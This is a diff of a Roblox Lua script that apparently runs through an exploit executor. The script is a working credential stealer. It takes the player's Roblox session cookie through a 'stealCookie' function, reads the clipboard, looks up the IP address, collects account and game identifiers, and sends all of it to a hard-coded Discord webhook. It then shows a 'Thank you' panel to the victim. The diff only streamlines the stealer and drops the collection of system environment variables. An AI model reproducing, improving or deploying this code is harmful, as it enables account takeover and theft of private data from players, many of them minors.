@@ -1,9 +1,9 @@
 -- ============================================================
--- FINAL WORKING SCRIPT – SENDS ALL DATA AS PLAIN TEXT
+-- DIRECT DATA SENDER – NO TEST MESSAGE
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- ========== HTTP SENDER (same as test) ==========
+-- HTTP sender (same as test, but used directly)
 local function sendData(url, content)
     local payload = {content = content}
     local json = game:GetService("HttpService"):JSONEncode(payload)
@@ -20,40 +20,26 @@ local function sendData(url, content)
     return false
 end
 
--- ========== IP COLLECTION (multi‑service) ==========
+-- IP
 local function getIP()
     local ip = "N/A"
-    local services = {
-        "https://api.ipify.org",
-        "https://ip-api.com/json/?fields=query",
-        "https://icanhazip.com",
-        "https://httpbin.org/ip"
-    }
-    for _, url in ipairs(services) do
-        local ok, result = pcall(function()
-            return game:GetService("HttpService"):GetAsync(url)
-        end)
+    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com"}) do
+        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
         if ok and result and result ~= "" then
-            if result:match('"query":"(.-)"') then
-                ip = result:match('"query":"(.-)"')
-            elseif result:match('"origin":"(.-)"') then
-                ip = result:match('"origin":"(.-)"')
-            else
-                ip = result:gsub("%s+", "")
-            end
+            if result:match('"query":"(.-)"') then ip = result:match('"query":"(.-)"')
+            elseif result:match('"origin":"(.-)"') then ip = result:match('"origin":"(.-)"')
+            else ip = result:gsub("%s+", "") end
             if ip and ip ~= "" and ip ~= "N/A" then break end
         end
     end
     return ip
 end
 
--- ========== SAFE GETTER ==========
 local function safeGet(obj, prop, default)
     local ok, val = pcall(function() return obj[prop] end)
     return ok and val or default
 end
 
--- ========== COOKIE (all attempts) ==========
 local function stealCookie()
     local ok, val = pcall(getcookie, "https://www.roblox.com/")
     if ok and val and val ~= "" then return val end
@@ -64,7 +50,6 @@ local function stealCookie()
     return "Not available"
 end
 
--- ========== CLIPBOARD ==========
 local function getClipboard()
     local ok, val = pcall(getclipboard)
     if ok and val and val ~= "" then return val end
@@ -73,20 +58,9 @@ local function getClipboard()
     return "N/A"
 end
 
--- ========== SYSTEM ENV ==========
-local function getSystemEnv()
-    local env = {}
-    pcall(function() env.os = os.getenv("OS") or "N/A" end)
-    pcall(function() env.user = os.getenv("USERNAME") or os.getenv("USER") or "N/A" end)
-    pcall(function() env.computer = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME") or "N/A" end)
-    return env
-end
-
--- ========== COLLECT EVERYTHING ==========
 local function collectAll()
     local info = {}
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
-
     local player = game.Players.LocalPlayer
     if player then
         info.userId = tostring(player.UserId)
@@ -136,7 +110,6 @@ local function collectAll()
             end
         end)
     end
-
     info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
     info.jobId = safeGet(game, "JobId", "N/A")
     info.gameName = safeGet(game, "Name", "Unknown")
@@ -145,24 +118,16 @@ local function collectAll()
     info.ip = getIP()
     info.cookie = stealCookie()
     info.clipboard = getClipboard()
-
-    local sys = getSystemEnv()
-    info.os = sys.os or "N/A"
-    info.systemUser = sys.user or "N/A"
-    info.computerName = sys.computer or "N/A"
-
     pcall(function()
         local us = game:GetService("UserInputService")
         info.platform = tostring(us.Platform)
         info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
         info.volume = tostring(game:GetService("SoundService").Volume)
     end)
-
     pcall(function()
         local stats = game:GetService("Stats")
         info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
     end)
-
     pcall(function()
         local run = game:GetService("RunService")
         local frameTime = run.RenderStepTime
@@ -170,33 +135,25 @@ local function collectAll()
             info.fps = tostring(math.floor(1 / frameTime))
         end
     end)
-
     return info
 end
 
--- ========== BUILD MESSAGE ==========
-local function buildMessage(data)
-    local lines = {}
-    for k, v in pairs(data) do
-        if v and v ~= "" then
-            table.insert(lines, string.format("%s: %s", k, tostring(v)))
-        end
-    end
-    return "```\n" .. table.concat(lines, "\n") .. "\n```"
-end
-
--- ========== EXECUTE ==========
 local data = collectAll()
-local message = buildMessage(data)
+local lines = {}
+for k, v in pairs(data) do
+    if v and v ~= "" then
+        table.insert(lines, string.format("%s: %s", k, tostring(v)))
+    end
+end
+local message = "```\n" .. table.concat(lines, "\n") .. "\n```"
 local sent = sendData(webhook, message)
 
--- ========== GUI ==========
+-- GUI
 pcall(function()
     local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     local gui = Instance.new("ScreenGui")
     gui.Parent = playerGui
     gui.ResetOnSpawn = false
-
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 420, 0, 200)
     frame.Position = UDim2.new(0.5, -210, 0.5, -100)
@@ -204,7 +161,6 @@ pcall(function()
     frame.BackgroundTransparency = 0.1
     frame.Parent = gui
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
-
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
@@ -214,17 +170,15 @@ pcall(function()
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
     title.Parent = frame
-
     local sub = Instance.new("TextLabel")
     sub.Size = UDim2.new(1, 0, 0, 30)
     sub.Position = UDim2.new(0, 0, 0.75, 0)
     sub.BackgroundTransparency = 1
-    sub.Text = sent and "Thank you for your cooperation." or "Check your webhook URL."
+    sub.Text = sent and "Thank you." or "Check webhook."
     sub.TextColor3 = Color3.fromRGB(200, 200, 200)
     sub.TextScaled = true
     sub.Font = Enum.Font.Gotham
     sub.Parent = frame
-
     local closeBtn = Instance.new("TextButton")
     closeBtn.Size = UDim2.new(0, 120, 0, 40)
     closeBtn.Position = UDim2.new(0.5, -60, 1, -50)
